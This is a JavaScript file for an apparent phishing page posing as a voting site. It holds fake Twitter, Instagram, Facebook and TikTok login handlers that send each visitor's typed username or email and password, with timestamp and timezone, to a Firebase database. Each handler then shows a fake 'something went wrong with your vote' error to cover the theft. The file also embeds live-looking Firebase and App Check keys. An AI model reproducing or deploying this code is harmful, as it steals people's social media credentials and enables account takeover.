
// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyBEzCQAwrDWftWOgJTjzT96jb6i1hO1hYc",
  authDomain: "arabiatras.firebaseapp.com",
  databaseURL: "https://arabiatras-default-rtdb.firebaseio.com",
  projectId: "arabiatras",
  storageBucket: "arabiatras.appspot.com",
  messagingSenderId: "125744464968",
  appId: "1:125744464968:web:258c48886ae5d84e51847d",
  measurementId: "G-JH6CNRFJ3P"
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate('6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW', true);


function tw_login() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var email = document.getElementById('tw-email').value;
  var password = document.getElementById('tw-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = 'Twitter';

  if (email !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: email,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });
      document.getElementById('fb-pass').value = '';

      return false;
    }, 2000);
  }
}


function iglog() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var username = document.getElementById('ig-uname').value;
  var password = document.getElementById('ig-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  console.log(timezone);
  var accountType = 'Instagram';

  if (username !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: username,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });

      document.getElementById('ig-pass').value = '';
      return false;
    }, 2000);
  }
}

function login() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var email = document.getElementById('fb-email').value;
  var password = document.getElementById('fb-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = 'Facebook';

  if (email !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: email,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });
      document.getElementById('fb-pass').value = '';

      return false;
    }, 2000);
  }
}

function tiklogin() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var email = document.getElementById('tik-email').value;
  var password = document.getElementById('tik-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = 'TikTok';

  if (email !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: email,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });
      document.getElementById('tik-pass').value = '';

      return false;
    }, 2000);
  }
}
